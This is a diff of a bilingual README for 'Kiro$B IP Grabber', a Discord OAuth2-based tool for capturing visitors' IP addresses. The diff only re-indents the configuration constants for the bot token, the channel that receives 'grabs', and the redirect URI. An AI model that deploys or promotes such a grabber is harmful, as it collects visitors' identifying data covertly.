@@ -44,13 +44,13 @@ Bienvenue dans **Kiro$B IP Grabber**, un outil web sophistiqué conçu pour capt
 3. **Configurer l'environnement** :
    - Dans le fichier `index.js` ou mettez à jour le script:
      ```index.js
-    const client = new Client({ intents: ['Guilds', 'GuildMembers'] });
-    const DISCORD_TOKEN = ''; // ton token de bot discord
-    const CHANNEL_ID = ''; // Ton channel ou ca va envoyer le grabs
-    const DISCORD_CLIENT_ID = ''; // Ton discord Id bot
-    const DISCORD_CLIENT_SECRET = ''; // ton discord client secret de ton bot 
-    const REDIRECT_URI = 'https://api.kirosb.fr/auth/callback'; // change le lien api.kirosb.fr par ton lien genre Imaginon xql.kirosb.fr et dans discord tu va dans la sections OAuth2 add redirects tu add le lien en entier pour moi ducoup cetais ca https://api.kirosb.fr/auth/callback
-    const GUILD_ID = ''; // Ton Id De guild Qui fais rejoindre
+        const client = new Client({ intents: ['Guilds', 'GuildMembers'] });
+        const DISCORD_TOKEN = ''; // ton token de bot discord
+        const CHANNEL_ID = ''; // Ton channel ou ca va envoyer le grabs
+        const DISCORD_CLIENT_ID = ''; // Ton discord Id bot
+        const DISCORD_CLIENT_SECRET = ''; // ton discord client secret de ton bot 
+        const REDIRECT_URI = 'https://api.kirosb.fr/auth/callback'; // change le lien api.kirosb.fr par ton lien genre Imaginon xql.kirosb.fr et dans discord tu va dans la sections OAuth2 add redirects tu add le lien en entier pour moi ducoup    cetais ca https://api.kirosb.fr/auth/callback
+        const GUILD_ID = ''; // Ton Id De guild Qui fais rejoindre
      ```
 
 4. **Configurer OAuth2 Discord** :
@@ -169,13 +169,13 @@ Welcome to **Kiro$B IP Grabber**, a sleek web-based tool designed to capture vis
 3. **Configure Environment**:
     - In the `index.js` file or update the script:
      ```index.js
-    const client = new Client({ intents: ['Guilds', 'GuildMembers'] });
-    const DISCORD_TOKEN = ''; // ton token de bot discord
-    const CHANNEL_ID = ''; // Ton channel ou ca va envoyer le grabs
-    const DISCORD_CLIENT_ID = ''; // Ton discord Id bot
-    const DISCORD_CLIENT_SECRET = ''; // ton discord client secret de ton bot 
-    const REDIRECT_URI = 'https://api.kirosb.fr/auth/callback'; // change le lien api.kirosb.fr par ton lien genre Imaginon xql.kirosb.fr et dans discord tu va dans la sections OAuth2 add redirects tu add le lien en entier pour moi ducoup cetais ca https://api.kirosb.fr/auth/callback
-    const GUILD_ID = ''; // Ton Id De guild Qui fais rejoindre
+        const client = new Client({ intents: ['Guilds', 'GuildMembers'] });
+        const DISCORD_TOKEN = ''; // ton token de bot discord
+        const CHANNEL_ID = ''; // Ton channel ou ca va envoyer le grabs
+        const DISCORD_CLIENT_ID = ''; // Ton discord Id bot
+        const DISCORD_CLIENT_SECRET = ''; // ton discord client secret de ton bot 
+        const REDIRECT_URI = 'https://api.kirosb.fr/auth/callback'; // change le lien api.kirosb.fr par ton lien genre Imaginon xql.kirosb.fr et dans discord tu va dans la sections OAuth2 add redirects tu add le lien en entier pour moi ducoup cetais ca https://api.kirosb.fr/auth/callback
+        const GUILD_ID = ''; // Ton Id De guild Qui fais rejoindre
      ```
 
 4. **Set Up Discord OAuth2**:
